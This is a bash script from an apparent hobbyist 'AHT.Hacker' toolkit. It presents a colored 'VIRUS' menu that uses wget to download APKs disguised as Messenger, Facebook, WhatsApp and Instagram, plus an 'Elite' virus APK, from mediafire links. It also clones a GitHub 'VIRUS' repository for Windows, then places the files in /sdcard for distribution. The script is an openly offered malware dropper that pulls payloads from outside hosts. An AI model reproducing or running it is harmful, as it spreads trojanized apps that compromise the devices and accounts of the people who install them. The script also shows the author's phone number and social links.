exiting(){                                                                                                            
x='\033[1;30m'
a='\033[1;31m'                                                                                                       
b='\033[1;32m'
c='\033[1;33m'
d='\033[1;34m'
e='\033[1;35m'
f='\033[1;36m'
g='\033[1;37m'
h='\033[1;38m'
i='\033[1;39m'
	echo ''
	echo ''
        echo -e "Do you want to$a EXIT$b [y/n]"
        echo -e "$d"
        read -p "[ AHT @ HAKER ]~# " xx
        if [ $xx == y ];then
                clear
                sleep 1
                figlet -f big "     Good By"
                echo ''
                echo -e "$a py : Ahmed Altorky"
                sleep 0.2
                echo -e "$e+++++++++++$a +++++++++++++++++++++ $d ++++++++++++++++++++++"
                sleep 0.2
                echo -e "$a AHT.Hacker V 2.0 "
                echo -e "$b +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
                sleep 0.2
                echo -e "$b Youtube : Ahmed Altorky Android "
                echo -e "$c +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
                sleep 0.2
                echo -e "$c watssapp : 01095616449 "
                echo -e "$d +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
                sleep 0.2
                echo -e "$d Facebook : https://www.facebook.com/Ahmed.Altorky.Android "
                sleep 0.2
                echo -e "$a+++++++++++$e +++++++++++++++++++++ $c +++++++++++++++++++++++" 
		exit
                elif [ $xx == n ];then
                cd $HOME/AHT.Hacker
                bash AHT.sh
fi

}


clear
g='\033[1;0m'
p='\033[1;35m'
c='\033[1;36m'
g='\033[1;32m'
a='\033[1;31m'
y='\033[1;33m'
b='\033[1;34m'
p='\033[1;35m'

virus(){
clear
echo -e "$red"
figlet -f big "		VIRUS AHT "
echo ''
echo -e "$c =$a A=$b H=$c T===>>~#$y [1]$p VIRUS For Android"
echo ''
sleep 1
echo -e "$c =$a A=$b H=$c T===>>~#$y [2]$p VIRUS For Windows"
echo ''
sleep 1
echo -e "$c =$a A=$b H=$c T===>>~#$a [00]$b Exit "
echo ''
sleep 1
echo -e "$c =$a A=$b H=$c T===>>~#$a [99]$c Back To Home "
echo ''
sleep 1
read -p "[ AHT @ Hacker ]~#  " aht
if [ $aht -eq 1 ];then
	echo ''
	sleep 0.4
	echo -e "$cyan   <<===>>~#$blue [1]$cyan Messenger " 
	echo ''
	sleep 0.4
	echo -e "$cyan   <<=======>>~#$blue [2]$green Facebook "
	echo ''
	sleep 0.4
	echo -e "$cyan   <<=============>>~#$blue [3]$red WhatsApp "
	echo ''
	sleep 0.4
	echo -e "$cyan   <<==================>>~#$blue [4]$yellow Instagram "
	echo ''
	sleep 0.4
	echo -e "$cyan   <<==============================>>~#$blue [5]$red virus "
	echo ''
	sleep 0.4
	echo -e "$cyan   <<=======================================>>~#$blue [99]$red Back To Home "
	echo ''
	sleep 0.4
	echo -e "$cyan   <<==============================================>>~#$blue [00]$g EXIT "

	echo -e "$green"
	read -p "[ AHT @ Hacker ]~#  " vi
	if [ $vi -eq 1 ];then
		figlet "	Messenger"
		sleep 1
		cd $HOME/AHT.Hacker/home
		bash .waite.sh
		echo ''
		cd $HOME
		wget http://download847.mediafire.com/r64vm7hk8dhg/h6fdoq73zslwohb/Messenger.apk > nn.txt
		mv Messenger.apk /sdcard
		rm nn.txt
		echo -e "$green ===================================== "
		echo -e "$purple Don the APK found in$red /sdcard    |"
		echo -e "$cyan ====================================== "
		virus
	elif [ $vi -eq 2 ];then
        	figlet "        Facebook"
		sleep 1
        	cd $HOME/AHT.Hacker/home
        	bash .waite.sh
        	echo ''
        	cd $HOME
		wget http://download1035.mediafire.com/ttpas8ig35eg/079wntqdr0jq31e/Facebook+hacker.apk > nn.txt
		rm nn.txt
		mv Facebook+hacker.apk /sdcard
        	echo -e "$green ===================================== "
        	echo -e "$purple Don the APK found in$red /sdcard    |"
        	echo -e "$cyan ====================================== "
		echo ''
        	virus
	elif [ $vi -eq 3 ];then
        	figlet "        Whatsapp"
		sleep 1
        	cd $HOME/AHT.Hacker/home
        	bash .waite.sh
        	echo ''
        	cd $HOME
		wget http://download1388.mediafire.com/4s6qyp4hbnug/t31t70yzcudgttu/WhatsApp.apk > nn.txt
		rm nn.txt
        	mv WhatsApp.apk /sdcard
		echo -e "$green ===================================== "
        	echo -e "$purple Don the APK found in$red /sdcard    |"
        	echo -e "$cyan ====================================== "
        	echo ''
        	virus
	elif [ $vi -eq 4 ];then
        	figlet "        Instagrame"
		sleep 1
        	cd $HOME/AHT.Hacker/home
        	bash .waite.sh
        	echo ''
        	cd $HOME
		wget http://download2266.mediafire.com/6pq5rqdtfdgg/bkckp73kd36zd8s/Instagram.apk > nn.txt
		rm nn.txt
        	mv Instagram.apk /sdcard
        	echo -e "$green ===================================== "
        	echo -e "$purple Don the APK found in$red /sdcard    |"
        	echo -e "$cyan ====================================== "
        	echo ''
        	virus
	elif [ $vi -eq 5 ];then
        	figlet "         Virus"
		sleep 1
        	cd $HOME/AHT.Hacker/home
        	bash .waite.sh
        	echo ''
        	cd $HOME
		wget http://download1654.mediafire.com/ac0ehce3c0sg/l7a94a022e6y3pp/Elite.apk > nn.txt
		rm nn.txt
        	mv Elite.apk /sdcard
        	echo -e "$green ===================================== "
        	echo -e "$purple Don the APK found in$red /sdcard    |"
        	echo -e "$cyan ====================================== "
        	echo ''
        	virus
	elif [ $vi -eq 99 ];then
		cd $HOME/AHT.Hacker
		bash AHT.sh
	elif [ $vi -eq 00 ];then
	
		exiting
	else
		virus
	fi
elif [ $aht -eq 2 ];then
	figlet " Virus For Windows"
	sleep 1
	cd $HOME/AHT.Hacker/home
        bash .waite.sh
        echo ''
        cd $HOME
	git clone https://github.com/Ahmed-Altorky-Android/VIRUS.git
	cd $HOME
	mv VIRUS /sdcard
	echo -e "$green ===================================== "
        echo -e "$purple Don the APK found in$red /sdcard    |"
        echo -e "$cyan ====================================== "
        echo ''
	sleep 5
        virus
elif [ $aht -eq 99 ];then
	cd $HOME/AHT.Hacker
	bash AHT.sh
elif [ $aht -eq 00 ];then
	exiting
else
	virus
fi

}

virus

exiting(){
x='\033[1;30m'
a='\033[1;31m'
b='\033[1;32m'
c='\033[1;33m'
d='\033[1;34m'
e='\033[1;35m'
f='\033[1;36m'
g='\033[1;37m'
h='\033[1;38m'
i='\033[1;39m'
        echo -e "Do you want to$a HOME$b [y/n]"
        echo -e "$d"
        read -p "[ AHT @ HAKER ]~# " xx
        if [ $xx == n ];then
		clear
                sleep 1
                figlet -f big "     Good By"
                echo ''
                echo -e "$a py : Ahmed Altorky"
                sleep 0.2
                echo -e "$e+++++++++++$a +++++++++++++++++++++ $d ++++++++++++++++++++++"
                sleep 0.2
                echo -e "$a AHT.Hacker V 2.0 "
                echo -e "$b +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
                sleep 0.2
                echo -e "$b Youtube : Ahmed Altorky Android "
                echo -e "$c +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
                sleep 0.2
                echo -e "$c watssapp : 01095616449 "
                echo -e "$d +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
                sleep 0.2
                echo -e "$d Facebook : https://www.facebook.com/Ahmed.Altorky.Android "
                sleep 0.2
                echo -e "$a+++++++++++$e +++++++++++++++++++++ $c +++++++++++++++++++++++"
                exit
		elif [ $xx == y ];then
                cd $HOME/AHT.Hacker
                bash AHT.sh
fi

}